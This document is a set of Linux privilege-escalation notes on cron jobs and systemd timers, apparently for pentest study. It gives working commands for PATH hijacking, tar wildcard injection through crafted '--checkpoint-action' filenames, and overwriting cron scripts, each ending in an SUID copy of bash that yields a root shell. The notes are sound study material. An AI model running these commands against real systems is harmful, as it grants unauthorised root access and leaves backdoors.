## Scheduled Task

#### Crons job & Systemd Timers overview

`cat /etc/crontab`

Check for task running every minute or 5 minutes etc.  
"*" across all means task is running every minutes.  
[PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

`systemctl list-timers --all`

* * *

#### Escalaion via cron paths

First see PATH and check which location is it checks first.  
Check if the task is present in the first location if not create a task in the same name which is having malicious code.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh` if [overwrite.sh](http://overwrite.sh) is a task.

Make [overwrite.sh](http://overwrite.sh) executable using `chmod +x overwrite.sh`

Wait for the code to execute.

then we can execute `/tmp/bash -p` this will excalate to root user.

* * *

#### Cron Wildcards

Check what the task is doing by using cat.

Check whether its using wild card *. Then we can do injection here.

For example:  
/usr/local/bin/compress.sh is task.

`cat /usr/local/bin/compress.sh` to check what its doing, suppose:

```sh
#!/bin/sh

cd /home/user
tar czf  /tmp/backup.tar.gz *
```

In the above example its making some backup and its using wildcard.
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh`

Make runme.sh executable by `chmod +x runme.sh`

Then we can use some tar specified cammands,
`touch /home/user/--checkpoint=1`
`touch /home/user/--checkpoint-action=exec=sh\ runme.sh`

The above commands will display progress message for every 1 number. When hit this checkpoint do some action. This is because there is wildcard. So above commands will be like: 
`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh\runme.sh`

So running `/tmp/bash -p` will give as root.

***

#### Cron File Overwrites

Just like cron path but instead of putting file in first path we can overwirte existing file for local privileage escalation or reverse shell.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh`.

Then run `/tmp/bash` after one minute get to root.